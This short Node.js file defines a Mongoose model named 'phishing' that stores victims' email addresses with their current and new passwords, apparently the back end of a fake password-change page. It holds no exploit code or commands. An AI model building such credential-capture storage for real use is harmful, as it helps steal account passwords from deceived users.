let mongoose = require('mongoose');
let PhishingSchema = new mongoose.Schema({
    email: String,
    current_password: String,
    new_password: String
})

let PhishingModel = mongoose.model('phishing', PhishingSchema);

module.exports = PhishingModel;
